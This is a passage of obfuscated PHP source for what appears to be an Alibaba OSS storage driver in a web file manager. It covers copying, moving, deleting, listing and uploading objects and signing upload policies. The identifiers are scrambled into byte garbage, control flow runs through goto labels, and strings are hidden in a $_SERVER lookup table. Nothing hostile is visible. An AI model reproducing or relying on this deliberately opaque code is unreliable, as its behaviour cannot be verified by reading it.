$dØé“Òˆã…; goto b„‰‘ÖÍ¶; F‹ö˜÷Î: $E²è­’Ê¿â = $BÎ…ëŞŸŒñ->getLastModified(); $dØé“Òˆã… = $EÏÈ·ôé®­ ? array($DŸ·ñÄÎ“¶[28] => $a­‘Ö¯Ë¡¯, $DŸ·ñÄÎ“¶[88] => $EÑ¬ˆæòùá, $DŸ·ñÄÎ“¶[207] => strtotime($E²è­’Ê¿â)) : $a­‘Ö¯Ë¡¯; $aÑÌÇ”²â = $EÑ¬ˆæòùá == 0 && substr($a­‘Ö¯Ë¡¯, strlen($a­‘Ö¯Ë¡¯) - 1, 1) == $DŸ·ñÄÎ“¶[8] ? !0 : !1; goto eĞìÑÙŒÓ; Cä’’ÒÅ¡•: if ($BÎ…ëŞŸŒñ->getKey() == $f’âÅÊà) { continue; } $a­‘Ö¯Ë¡¯ = $BÎ…ëŞŸŒñ->getKey(); $EÑ¬ˆæòùá = $BÎ…ëŞŸŒñ->getSize(); goto F‹ö˜÷Î; b„‰‘ÖÍ¶: } foreach ($B ­í†á as $f£™‰íŞ) { $CìŸŸ‹œ[] = $f£™‰íŞ->getPrefix(); if ($F³ºÕ¨åÉ) { $this->cacheMethod($DŸ·ñÄÎ“¶[209], $a­‘Ö¯Ë¡¯, !0); } } if ($D¶±ÍÕŞ£µ === $DŸ·ñÄÎ“¶[33]) { break; } } if ($F³ºÕ¨åÉ) { $this->cacheMethod($DŸ·ñÄÎ“¶[209], $EĞÇ´²ñ°, !0); } goto cŒÜ»©¥ÜÀ; cŒÜ»©¥ÜÀ: return array($DŸ·ñÄÎ“¶[85] => $CìŸŸ‹œ, $DŸ·ñÄÎ“¶[84] => $cÁË×¨Íá ); goto b‹šá«Ğì•; c–©ƒº…×‰: $D¶±ÍÕŞ£µ = $DŸ·ñÄÎ“¶[33]; $dá”Æ¢ö«ğ = 1000; $F³ºÕ¨åÉ = $this->listItemCache === !1 ? !1 : !0; goto C…à“ï­‚; e›‰ª™’ß¾: $DŸ·ñÄÎ“¶ =& $_SERVER[Ü˜]; $EĞÇ´²ñ° = trim($EĞÇ´²ñ°, $DŸ·ñÄÎ“¶[8]); $f’âÅÊà = empty($EĞÇ´²ñ°) && $EĞÇ´²ñ° !== $DŸ·ñÄÎ“¶[201] ? $DŸ·ñÄÎ“¶[33] : $EĞÇ´²ñ° . $DŸ·ñÄÎ“¶[8]; goto c–©ƒº…×‰; b‹šá«Ğì•: } public function copyFile($Aí«ĞÏºóŞ, $E®‰ˆ³‰È„) { $d¡ì¯¸ÅÌò = $this->size($Aí«ĞÏºóŞ); if ($d¡ì¯¸ÅÌò < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Aí«ĞÏºóŞ, $this->bucket, $this->pathEncode($E®‰ˆ³‰È„)); } catch (OSS\Core\OssException $aíµ•ã‚²) { return !1; } return $this->getPathOuter($E®‰ˆ³‰È„); } $dŠ¤±èŸ = $this->multiCopyObject($Aí«ĞÏºóŞ, $E®‰ˆ³‰È„, $d¡ì¯¸ÅÌò); return $dŠ¤±èŸ ? $this->getPathOuter($E®‰ˆ³‰È„) : !1; } private function multiCopyObject($Bñ‰ ™ğ, $f¥¥Ú£ÂÒŞ, $A‚´Œá‚) { $FÆ‰¤™ê =& $_SERVER[Ü˜]; try { goto Bô¿ğ¹¢ƒ; Bô¿ğ¹¢ƒ: $c‚Á¶¡‚ = array(); if ($CÇò…ˆ‚¥ì = $this->hashMd5($Bñ‰ ™ğ)) { $c‚Á¶¡‚ = array(OSS\OssClient::OSS_HEADERS => array($FÆ‰¤™ê[1278] => $CÇò…ˆ‚¥ì)); } $D‰éù‡¢ì× = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f¥¥Ú£ÂÒŞ), $c‚Á¶¡‚); goto A˜•Î¸³ë‡; A˜•Î¸³ë‡: $c™ÉŞ´¡Ç¸ = 1; $e¢ë¿Ç¤öô = 0; $A„ŸçØ¾ = array(); goto eÛÇòÒÙ‹ğ; Eõ¯£×ï†ğ: $AÔ–£·«Ó = array(); foreach ($A„ŸçØ¾ as $Eëîãš‡Î => $EÑ¹ï¢´à ) { $AÔ–£·«Ó[] = array($FÆ‰¤™ê[1282] => $Eëîãš‡Î + 1, $FÆ‰¤™ê[1283] => $EÑ¹ï¢´à ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($f¥¥Ú£ÂÒŞ), $D‰éù‡¢ì×, $AÔ–£·«Ó); goto cÉ¢çä‡´…; eÛÇòÒÙ‹ğ: $eöÎ‘˜É = 1024 * 1024 * 10; $FÖàÅÒêÔš = $this->client->generateMultiuploadParts($A‚´Œá‚, $eöÎ‘˜É); foreach ($FÖàÅÒêÔš as $Eëîãš‡Î => $B¦œßÆé¾Œ) { $e¢ŒÏ¤­¿ë = $e¢ë¿Ç¤öô + (int) $B¦œßÆé¾Œ[$FÆ‰¤™ê[1279]]; $b”“¸›Ä‰§ = (int) $B¦œßÆé¾Œ[$FÆ‰¤™ê[344]] + $e¢ŒÏ¤­¿ë - 1; $dƒ©ãÑ¥Õ¤ = array($FÆ‰¤™ê[1280] => $e¢ŒÏ¤­¿ë, $FÆ‰¤™ê[1281] => $b”“¸›Ä‰§); $A„ŸçØ¾[] = $this->client->uploadPartCopy($this->bucket, $Bñ‰ ™ğ, $this->bucket, $this->pathEncode($f¥¥Ú£ÂÒŞ), $c™ÉŞ´¡Ç¸, $D‰éù‡¢ì×, $dƒ©ãÑ¥Õ¤); $c™ÉŞ´¡Ç¸ = $c™ÉŞ´¡Ç¸ + 1; } goto Eõ¯£×ï†ğ; cÉ¢çä‡´…: } catch (OSS\Core\OssException $dèãÛ†ÄÕ…) { return !1; } return !0; } public function moveFile($c™†Ò”öÏİ, $FÀ¤õ´ˆÛš) { if ($this->copyFile($c™†Ò”öÏİ, $FÀ¤õ´ˆÛš)) { $this->remove($c™†Ò”öÏİ); return $this->getPathOuter($FÀ¤õ´ˆÛš); } return !1; } public function delFile($eÌÚàÕˆ‰å) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($eÌÚàÕˆ‰å)); } catch (OSS\Core\OssException $cÌ¦Ï“ö¦) { return !1; } return !0; } public function delFolder($b»Œ ‚ÒÃº) { goto CóÂŞ­ç‚°; CóÂŞ­ç‚°: $f‰ËŒÙù»ø =& $_SERVER[Ü˜]; if (!$this->exist($b»Œ ‚ÒÃº)) { return !0; } $this->listItemCache = !1; goto bèÇÈºø; bèÇÈºø: $D¦‘Ú¤¨²ó = $this->fileList($b»Œ ‚ÒÃº); $this->listItemCache = !0; $CòŒêŒƒ‰› = trim($b»Œ ‚ÒÃº, $f‰ËŒÙù»ø[8]) . $f‰ËŒÙù»ø[8]; goto Fƒƒêòõî; b‘¼æõ¼ÚŒ: $dÂ­õî¥ßõ = $this->delByBatch($D¦‘Ú¤¨²ó[$f‰ËŒÙù»ø[85]]); if (!$dÂ­õî¥ßõ) { return !1; } return $this->delFile($CòŒêŒƒ‰›); goto dËÈ´‡¡åË; Fƒƒêòõî: if (!empty($b»Œ ‚ÒÃº) && $b»Œ ‚ÒÃº !== $f‰ËŒÙù»ø[201] && !in_array($CòŒêŒƒ‰›, $D¦‘Ú¤¨²ó[$f‰ËŒÙù»ø[85]])) { $D¦‘Ú¤¨²ó[$f‰ËŒÙù»ø[85]][] = $CòŒêŒƒ‰›; } $dÂ­õî¥ßõ = $this->delByBatch($D¦‘Ú¤¨²ó[$f‰ËŒÙù»ø[84]]); if (!$dÂ­õî¥ßõ) { return !1; } goto b‘¼æõ¼ÚŒ; dËÈ´‡¡åË: } private function delByBatch($CŒĞ´’‰å) { foreach (array_chunk($CŒĞ´’‰å, 1000) as $E‘’ù„‘óÕ) { try { $this->client->deleteObjects($this->bucket, $E‘’ù„‘óÕ); } catch (OSS\Core\OssException $FÏÚÅ›ĞŸè) { return !1; } } return !0; } public function rename($Aô„Û®ƒ, $CÆ¡¦ïÊƒï) { return $this->renameObject($Aô„Û®ƒ, $CÆ¡¦ïÊƒï); } private function fileInfo($c®Êµî¾¤, $c´åŒêë”† = false, $BòìÜ¾Ÿ¿ = array()) { goto b©›¡¡Ü¸‹; f÷ñá‡±: if (isset($BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[88]])) { $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[88]] = $BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[88]]; } if (isset($BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[94]])) { $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[94]] = $BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[94]]; } if (isset($BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[207]]) && !trim($dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[94]])) { $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[94]] = $BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[207]]; } goto díÊãæà«Ç; díÊãæà«Ç: return $dÇİ‡ëÑØ¤; goto E¦Ø„’´¨–; dÒ¢Õ¤®–: $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[204]] = $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[94]] = 0; $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[205]] = $dÇİ‡ëÑØ¤[$EŒà·…ƒÛÅ[206]] = !0; if (empty($BòìÜ¾Ÿ¿)) { $F‰ÛìĞÖÉ = $this->objectMeta($c®Êµî¾¤); if (!$F‰ÛìĞÖÉ) { return $dÇİ‡ëÑØ¤; } $BòìÜ¾Ÿ¿ = array($EŒà·…ƒÛÅ[94] => strtotime($F‰ÛìĞÖÉ[$EŒà·…ƒÛÅ[1277]]), $EŒà·…ƒÛÅ[88] => $F‰ÛìĞÖÉ[$EŒà·…ƒÛÅ[1276]] + 0); } goto f÷ñá‡±; b©›¡¡Ü¸‹: $EŒà·…ƒÛÅ =& $_SERVER[Ü˜]; $dÇİ‡ëÑØ¤ = array($EŒà·…ƒÛÅ[28] => $this->pathThis($c®Êµî¾¤), $EŒà·…ƒÛÅ[86] => $this->getPathOuter($c®Êµî¾¤), $EŒà·…ƒÛÅ[29] => $EŒà·…ƒÛÅ[203], $EŒà·…ƒÛÅ[88] => isset($BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[88]]) ? $BòìÜ¾Ÿ¿[$EŒà·…ƒÛÅ[88]] : 0, $EŒà·…ƒÛÅ[178] => $this->ext($c®Êµî¾¤)); if ($c´åŒêë”†) { return $dÇİ‡ëÑØ¤; } goto dÒ¢Õ¤®–; E¦Ø„’´¨–: } private function folderInfo($aÂÛ³¢¾èà, $EÑÔ¸‰‚ƒé = false, $D–‹°“İ‚  = array()) { goto A‡½›–Æ²â; A‡½›–Æ²â: $EäË´»­§ =& $_SERVER[Ü˜]; $fõ®ˆâÓÁ° = array($EäË´»­§[28] => $this->pathThis($aÂÛ³¢¾èà), $EäË´»­§[86] => $this->getPathOuter($EäË´»­§[8] . $aÂÛ³¢¾èà), $EäË´»­§[29] => $EäË´»­§[87]); if ($EÑÔ¸‰‚ƒé) { return $fõ®ˆâÓÁ°; } goto EçÕ¬ãè¾«; BäÉµá’¶Ã: if (isset($D–‹°“İ‚ [$EäË´»­§[94]])) { $fõ®ˆâÓÁ°[$EäË´»­§[94]] = $D–‹°“İ‚ [$EäË´»­§[94]]; } if (isset($D–‹°“İ‚ [$EäË´»­§[204]])) { $fõ®ˆâÓÁ°[$EäË´»­§[204]] = $D–‹°“İ‚ [$EäË´»­§[204]]; } return $fõ®ˆâÓÁ°; goto fŸ™ŠÉ“ëƒ; EçÕ¬ãè¾«: $fõ®ˆâÓÁ°[$EäË´»­§[204]] = $fõ®ˆâÓÁ°[$EäË´»­§[94]] = 0; $fõ®ˆâÓÁ°[$EäË´»­§[205]] = $fõ®ˆâÓÁ°[$EäË´»­§[206]] = !0; if (empty($D–‹°“İ‚ )) { $aÂÛ³¢¾èà = rtrim($aÂÛ³¢¾èà, $EäË´»­§[8]) . $EäË´»­§[8]; $c˜ˆÊÚ¬èğ = $this->objectMeta($aÂÛ³¢¾èà); if (!$c˜ˆÊÚ¬èğ) { return $fõ®ˆâÓÁ°; } $D–‹°“İ‚  = array($EäË´»­§[204] => $c˜ˆÊÚ¬èğ[$EäË´»­§[1284]][$EäË´»­§[1285]], $EäË´»­§[94] => strtotime($c˜ˆÊÚ¬èğ[$EäË´»­§[1277]])); } goto BäÉµá’¶Ã; fŸ™ŠÉ“ëƒ: } public function listPath($e‰²¡Š¼·‚, $B…’³ä®Ïï = false) { $añÈá¶°š =& $_SERVER[Ü˜]; $b‰ñìßÍÓ = $this->fileList($e‰²¡Š¼·‚, $añÈá¶°š[8], !0); foreach ($b‰ñìßÍÓ[$añÈá¶°š[85]] as $bŒ°Óø°Óé => $cŠºàôİ±) { $b‰ñìßÍÓ[$añÈá¶°š[85]][$bŒ°Óø°Óé] = $this->folderInfo($cŠºàôİ±, $B…’³ä®Ïï, $cŠºàôİ±); } foreach ($b‰ñìßÍÓ[$añÈá¶°š[84]] as $bŒ°Óø°Óé => $cŠºàôİ±) { $b‰ñìßÍÓ[$añÈá¶°š[84]][$bŒ°Óø°Óé] = $this->fileInfo($cŠºàôİ±[$añÈá¶°š[28]], $B…’³ä®Ïï, $cŠºàôİ±); } return $b‰ñìßÍÓ; } public function has($BêÛÌ»ˆÎ³, $E¿öáéù• = false, $e‰¡Æ»«³ó = true) { goto d®æ´ĞÒ–; d®æ´ĞÒ–: $bÛĞªò½¶ =& $_SERVER[Ü˜]; $BêÛÌ»ˆÎ³ = trim($BêÛÌ»ˆÎ³, $bÛĞªò½¶[8]); $BÒÂØ£«¼ê = empty($BêÛÌ»ˆÎ³) && $BêÛÌ»ˆÎ³ !== $bÛĞªò½¶[201] ? $bÛĞªò½¶[33] : $BêÛÌ»ˆÎ³ . $bÛĞªò½¶[8]; goto BÒÀ°¬®ô°; BÒÀ°¬®ô°: $f …‰åß‘ğ = $bÛĞªò½¶[33]; $C†íÌÖ±Ë = 500; $CÅÑÔ§ÄÜ» = $f¥Ë¡İ¿Ä‰ = 0; goto Dã§·‰¼øî; Dã§·‰¼øî: while (!0) { check_abort(); $BñÍ”Åê¿® = array($bÛĞªò½¶[1272] => $bÛĞªò½¶[8], $bÛĞªò½¶[1273] => $BÒÂØ£«¼ê, $bÛĞªò½¶[1274] => $C†íÌÖ±Ë, $bÛĞªò½¶[1275] => $f …‰åß‘ğ); try { $fæ‡ÛÆ²êæ = $this->client->listObjects($this->bucket, $BñÍ”Åê¿®); } catch (OSS\Core\OssException $aÎ¼³Ú’) { break; } $f …‰åß‘ğ = $fæ‡ÛÆ²êæ->getNextMarker(); $Cäøò¬¬Æ™ = $fæ‡ÛÆ²êæ->getObjectList(); $e£’ÇĞîè– = $fæ‡ÛÆ²êæ->getPrefixList(); if ($E¿öáéù•) { if (count($Cäøò¬¬Æ™) > 1 || count($Cäøò¬¬Æ™) == 1 && $Cäøò¬¬Æ™[0]->getKey() != $BÒÂØ£«¼ê) { $CÅÑÔ§ÄÜ» += count($Cäøò¬¬Æ™) - 1; } if (!empty($e£’ÇĞîè–)) { $f¥Ë¡İ¿Ä‰ += count($e£’ÇĞîè–); } if ($f …‰åß‘ğ === $bÛĞªò½¶[33]) { break; } continue; } if ($e‰¡Æ»«³ó) { if (!empty($Cäøò¬¬Æ™)) { if (count($Cäøò¬¬Æ™) > 1 || $Cäøò¬¬Æ™[0]->getKey() != $BÒÂØ£«¼ê) { return !0; } } } else { if (!empty($e£’ÇĞîè–)) { return !0; } } if ($f …‰åß‘ğ === $bÛĞªò½¶[33]) { break; } } if ($E¿öáéù•) { return array($bÛĞªò½¶[213] => $CÅÑÔ§ÄÜ», $bÛĞªò½¶[214] => $f¥Ë¡İ¿Ä‰); } return !1; goto EÄ˜øÁ; EÄ˜øÁ: } public function listAll($aç²ö«¥ç›) { $AÏ‡Şèè×™ =& $_SERVER[Ü˜]; $e‡åâ·èö” = $this->fileList($aç²ö«¥ç›, $AÏ‡Şèè×™[33], !0); $Fƒ¢±’“¥ = array(); foreach ($e‡åâ·èö”[$AÏ‡Şèè×™[84]] as $FãËš‰­ Ü) { $Fƒ¢±’“¥[$FãËš‰­ Ü[$AÏ‡Şèè×™[28]]] = $FãËš‰­ Ü[$AÏ‡Şèè×™[88]]; } foreach ($e‡åâ·èö”[$AÏ‡Şèè×™[85]] as $FãËš‰­ Ü) { if (is_string($FãËš‰­ Ü)) { $Fƒ¢±’“¥[$FãËš‰­ Ü] = 0; } } return $this->listAllFiles($aç²ö«¥ç›, array_keys($Fƒ¢±’“¥), $Fƒ¢±’“¥); } public function canRead($C©õ‚İ´Ç) { $aµ¢Â½´Ğƒ =& $_SERVER[Ü˜]; $C„ªÉêÃŞù = $this->pathAcl($C©õ‚İ´Ç); return $C„ªÉêÃŞù == $aµ¢Â½´Ğƒ[1286] || $C„ªÉêÃŞù == $aµ¢Â½´Ğƒ[528] ? !0 : !1; } public function canWrite($DÏŠº¢¢) { $cìÚĞÑËŞ = $this->pathAcl($DÏŠº¢¢); return $cìÚĞÑËŞ == $_SERVER[Ü˜][528] ? !0 : !1; } public function pathAcl($dÔé–Œ°) { goto Fƒ°†¢®Â; Få¯ƒŠäƒ: $Eéêßâß« = $bèÅ¹¥×¥‡ == $Cİ¸šáÚÖˆ[34] ? $this->bucketAcl : $bèÅ¹¥×¥‡; if ($Eéêßâß« == $Cİ¸šáÚÖˆ[1287]) { return $Cİ¸šáÚÖˆ[1286]; } if ($Eéêßâß« == $Cİ¸šáÚÖˆ[1288]) { return $Cİ¸šáÚÖˆ[528]; } goto b²ÊŞ„ˆâÓ; Fƒ°†¢®Â: $Cİ¸šáÚÖˆ =& $_SERVER[Ü˜]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bèÅ¹¥×¥‡ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($dÔé–Œ°)); } catch (OSS\Core\OssException $eÅï¸À‹ñ÷) { return !1; } goto Få¯ƒŠäƒ; b²ÊŞ„ˆâÓ: return $Eéêßâß«; goto eÖæâÒ¤˜É; eÖæâÒ¤˜É: } private function chmodPath($DìçµÄÑö‹, $c·³Œ—¬ä˜ = '') { $D’Êë¡‰  =& $_SERVER[Ü˜]; $a‰ªÑ²‹–— = empty($c·³Œ—¬ä˜) ? $D’Êë¡‰ [1288] : $c·³Œ—¬ä˜; $aÔ”ÕÃ„ºÈ = array($D’Êë¡‰ [34], $D’Êë¡‰ [202], $D’Êë¡‰ [1287], $D’Êë¡‰ [1288]); if (!in_array($a‰ªÑ²‹–—, $aÔ”ÕÃ„ºÈ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($DìçµÄÑö‹), $a‰ªÑ²‹–—); } catch (OSS\Core\OssException $DãŸó¸š¬Ä) { return !1; } return !0; } public function getContent($C»Ö›°–È) { return $this->fileSubstr($C»Ö›°–È, -1); } public function setContent($CˆßËÎ·Öƒ, $f¾òˆÄèĞ = '') { $d•ì¥â¿“« =& $_SERVER[Ü˜]; try { $E¯î«Šö™Ş = $this->trafficLimit($d•ì¥â¿“«[1289]); $aî—òìˆ¨ = $this->client->putObject($this->bucket, $this->pathEncode($CˆßËÎ·Öƒ), $f¾òˆÄèĞ, $E¯î«Šö™Ş); } catch (OSS\Core\OssException $a–ˆ…­”‚Ş) { return !1; } $D±ÀÛ¡Æº = array($d•ì¥â¿“«[1278] => trim($aî—òìˆ¨[$d•ì¥â¿“«[1290]], $d•ì¥â¿“«[126]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CˆßËÎ·Öƒ))); $this->updateObjMeta($CˆßËÎ·Öƒ, $D±ÀÛ¡Æº); return isset($aî—òìˆ¨[$d•ì¥â¿“«[1291]][$d•ì¥â¿“«[1237]]) ? !0 : !1; } private function updateObjMeta($FÚ‰ôö¢¨Õ, $fÔ¾’–‡ƒ) { $FÚ‰ôö¢¨Õ = $this->pathEncode($FÚ‰ôö¢¨Õ); try { $DÛ«‡“ğÇ = array(OSS\OssClient::OSS_HEADERS => $fÔ¾’–‡ƒ); $this->client->copyObject($this->bucket, $FÚ‰ôö¢¨Õ, $this->bucket, $FÚ‰ôö¢¨Õ, $DÛ«‡“ğÇ); } catch (OSS\Core\OssException $cÒÉ…¥ï‚‹) { return !1; } return !0; } public function upload($A÷œñšÔÑ, $aŒµƒ‹Šô, $DÊ‰êöîÊ¿ = false, $EãÆœÁ¹”ò = REPEAT_REPLACE) { $Bò÷Şö²Á =& $_SERVER[Ü˜]; $aº˜ç¨¦ = trim($A÷œñšÔÑ, $Bò÷Şö²Á[8]); $dªŸõÈ¢É = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Bò÷Şö²Á[1278] => @md5_file($aŒµƒ‹Šô)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A÷œñšÔÑ))); $dªŸõÈ¢É = $this->trafficLimit($Bò÷Şö²Á[1289], $dªŸõÈ¢É); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($aº˜ç¨¦), $aŒµƒ‹Šô, $dªŸõÈ¢É); } catch (OSS\Core\OssException $eŞÔİ‡ ) { return !1; } return $this->getPathOuter($A÷œñšÔÑ); } public function getHost() { $d‡Ã‡½ˆˆ¥ =& $_SERVER[Ü˜]; $BÍ˜³à´Ö  = explode($d‡Ã‡½ˆˆ¥[187], parent::getHost()); return $BÍ˜³à´Ö [0] . $d‡Ã‡½ˆˆ¥[187] . $this->bucket . $d‡Ã‡½ˆˆ¥[105] . $BÍ˜³à´Ö [1]; } public function uploadFormData($BÜÜ«»›Èò, $e¥ŸİÒ‡ÂË = 3600) { goto dÁà—¨í´÷; aØé›¨š¡–: return $Bá›ŒÁÅğ; goto Bš°Â¶ˆµ×; e‡›Ãï¾¸Ë: $c‹É·ñ¼ã = strpos($A¿Äèè‘„õ, $B®ë¤î´µÒ[303]); $A¿Äèè‘„õ = substr($A¿Äèè‘„õ, 0, $c‹É·ñ¼ã) . $B®ë¤î´µÒ[1293]; $bÕò±®·ìˆ = 1048576000 * 5; goto e§«”°Š‡Ì; e§«”°Š‡Ì: $EœÑ‹´Šï = $this->pathFather($BÜÜ«»›Èò); $bå§íÇ¿è = array($B®ë¤î´µÒ[1192] => $A¿Äèè‘„õ, $B®ë¤î´µÒ[1193] => array(array($B®ë¤î´µÒ[1294], 0, $bÕò±®·ìˆ), array($B®ë¤î´µÒ[1196], $B®ë¤î´µÒ[1197], $EœÑ‹´Šï))); $Cß¶ô«÷ù = base64_encode(json_encode($bå§íÇ¿è)); goto Fîå§±ŠĞ; AÙŒè§¾Ş: $B‘Ôİ¬ĞĞ = date($B®ë¤î´µÒ[1292], time() + $Då²«¤¯Ÿ—); $E®ÕÑ„­½ª = new DateTime($B‘Ôİ¬ĞĞ); $A¿Äèè‘„õ = $E®ÕÑ„­½ª->format(DateTime::ISO8601); goto e‡›Ãï¾¸Ë; Fîå§±ŠĞ: $d–Ğ‡¯ëæ¿ = base64_encode(hash_hmac($B®ë¤î´µÒ[239], $Cß¶ô«÷ù, $this->secret, !0)); $Bá›ŒÁÅğ = array($B®ë¤î´µÒ[1202] => $Cß¶ô«÷ù, $B®ë¤î´µÒ[1295] => $this->accessKey, $B®ë¤î´µÒ[1198] => $B®ë¤î´µÒ[1190], $B®ë¤î´µÒ[1296] => $d–Ğ‡¯ëæ¿, $B®ë¤î´µÒ[185] => $FÅÖå‡­³); $Bá›ŒÁÅğ = $this->trafficLimit($B®ë¤î´µÒ[1289], $Bá›ŒÁÅğ); goto aØé›¨š¡–; dÁà—¨í´÷: $B®ë¤î´µÒ =& $_SERVER[Ü˜]; if (!($FÅÖå‡­³ = $this->getHost())) { return !1; } $Då²«¤¯Ÿ— = $e¥ŸİÒ‡ÂË; goto AÙŒè§¾Ş; Bš°Â¶ˆµ×: } public function multiUploadFormData($DêŠà©·œ«, $A•¦È½ÀŠ = 3600) { $d ™¡¾˜‡ó =& $_SERVER[Ü˜]; if (!($eÀŒ‰˜›¬Ã = $this->getHost())) { return !1; } $cÁ¦ ˆ¨ğ = $this->trafficLimit($d ™¡¾˜‡ó[1289]); $bãŠß³Õ® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($DêŠà©·œ«), $cÁ¦ ˆ¨ğ); return array($d ™¡¾˜‡ó[231] => $bãŠß³Õ®, $d ™¡¾˜‡ó[185] => $eÀŒ‰˜›¬Ã . $d ™¡¾˜‡ó[8] . $this->pathEncode($DêŠà©·œ«), $d ™¡¾˜‡ó[232] => gmdate($d ™¡¾˜‡ó[1297]), $d ™¡¾˜‡ó[103] => $DêŠà©·œ«); } public function multiUploadAuthData($aø¢’öğ¢é, $c¥„„¸¼Ù = array()) { goto eŒŒñˆ¯’; EŸ›æšÚä: if (!empty($c¥„„¸¼Ù[$EëÑ¡®°Ìö[1299]])) { $e¿™˜‚Øïå = array_merge(array($f‹Ö‡®êî‘[4]), $c¥„„¸¼Ù[$EëÑ¡®°Ìö[1299]]); sort($e¿™˜‚Øïå); $f‹Ö‡®êî‘[4] = implode($EëÑ¡®°Ìö[63], $e¿™˜‚Øïå); } $C°Òè¥“´¶ = implode($EëÑ¡®°Ìö[63], $f‹Ö‡®êî‘); $dÄÔº…À„¨ = base64_encode(hash_hmac($EëÑ¡®°Ìö[239], $C°Òè¥“´¶, $this->secret, !0)); goto cç‘¡–°÷„; eŒŒñˆ¯’: $EëÑ¡®°Ìö =& $_SERVER[Ü˜]; $dØ½âëßÃ† = isset($c¥„„¸¼Ù[$EëÑ¡®°Ìö[232]]) ? $c¥„„¸¼Ù[$EëÑ¡®°Ìö[232]] : gmdate($EëÑ¡®°Ìö[1297]); $BÉ‰íõ¾‘ë = isset($c¥„„¸¼Ù[$EëÑ¡®°Ìö[178]]) ? $c¥„„¸¼Ù[$EëÑ¡®°Ìö[178]] : $EëÑ¡®°Ìö[33]; goto Bî¯ï¥Â‚; Bî¯ï¥Â‚: $Cä¶Êº²Ãˆ = $aø¢’öğ¢é; if (isset($c¥„„¸¼Ù[$EëÑ¡®°Ìö[103]])) { $Cä¶Êº²Ãˆ = $c¥„„¸¼Ù[$EëÑ¡®°Ìö[103]]; unset($c¥„„¸¼Ù[$EëÑ¡®°Ìö[103]]); } if (isset($c¥„„¸¼Ù[$EëÑ¡®°Ìö[233]])) { $c¥„„¸¼Ù[$EëÑ¡®°Ìö[232]] = $dØ½âëßÃ†; return $this->listUploadParts($Cä¶Êº²Ãˆ, $c¥„„¸¼Ù); } goto D‰ğ–®ƒÍí; D‰ğ–®ƒÍí: $f‹Ö‡®êî‘ = array($EëÑ¡®°Ìö[234], $EëÑ¡®°Ìö[33], $EëÑ¡®°Ìö[129], $dØ½âëßÃ†, "\170\x2d\157\163\x73\55\x64\141\x74\145\x3a{$dØ½âëßÃ†}", $EëÑ¡®°Ìö[8] . $this->bucket . $EëÑ¡®°Ìö[8] . $Cä¶Êº²Ãˆ . $BÉ‰íõ¾‘ë); if (strpos($BÉ‰íõ¾‘ë, $EëÑ¡®°Ìö[235]) === 0) { $f‹Ö‡®êî‘[0] = $EëÑ¡®°Ìö[236]; if ($b‰ÉÊïÍ¼ = $this->trafficLimit($EëÑ¡®°Ìö[1289])) { $Cä¶Êº²Ãˆ = $EëÑ¡®°Ìö[1298]; array_splice($f‹Ö‡®êî‘, 5, 0, $Cä¶Êº²Ãˆ . $EëÑ¡®°Ìö[4] . $b‰ÉÊïÍ¼[$Cä¶Êº²Ãˆ]); } } if (isset($c¥„„¸¼Ù[$EëÑ¡®°Ìö[237]]) && $c¥„„¸¼Ù[$EëÑ¡®°Ìö[237]] == $EëÑ¡®°Ìö[238]) { $f‹Ö‡®êî‘[0] = $EëÑ¡®°Ìö[238]; } goto EŸ›æšÚä; cç‘¡–°÷„: $eÅÈÓ°Œ» = $EëÑ¡®°Ìö[1262] . $this->accessKey . $EëÑ¡®°Ìö[4] . $dÄÔº…À„¨; if (strpos($BÉ‰íõ¾‘ë, $EëÑ¡®°Ìö[235]) === 0) { $eÅÈÓ°Œ» = array($EëÑ¡®°Ìö[241] => $eÅÈÓ°Œ», $EëÑ¡®°Ìö[232] => $dØ½âëßÃ†); if ($b‰ÉÊïÍ¼) { $eÅÈÓ°Œ» = array_merge($eÅÈÓ°Œ», $b‰ÉÊïÍ¼); } } return $eÅÈÓ°Œ»; goto A”ùˆ†øõ; A”ùˆ†øõ: } public function listUploadParts($a»‘òª²¦ö, $fØëèù…ÃÄ) { goto F‚¢êŠ—ß…; F‚¢êŠ—ß…: $f§«µ¹­Öó =& $_SERVER[Ü˜]; $añÅø’›š“ = parse_url_query($fØëèù…ÃÄ[$f§«µ¹­Öó[178]]); $E°±šŸç†… = $this->client->listParts($this->bucket, $this->pathEncode($a»‘òª²¦ö), $añÅø’›š“[$f§«µ¹­Öó[231]]); goto Aø™©ª­; cÁŞÒ³Ø‚: unset($fØëèù…ÃÄ[$f§«µ¹­Öó[233]], $fØëèù…ÃÄ[$f§«µ¹­Öó[237]]); $A‰˜Íîê† = $this->multiUploadAuthData($a»‘òª²¦ö, $fØëèù…ÃÄ); if (empty($A‰˜Íîê†)) { return !1; } goto F–»Æ’óìŒ; F–»Æ’óìŒ: return array($f§«µ¹­Öó[241] => $A‰˜Íîê†, $f§«µ¹­Öó[232] => $fØëèù…ÃÄ[$f§«µ¹­Öó[232]], $f§«µ¹­Öó[243] => $D¼šÊ¯Í‡“); goto AÌ£ˆê³¼Ü; Aø™©ª­: $D––´…½¨ = 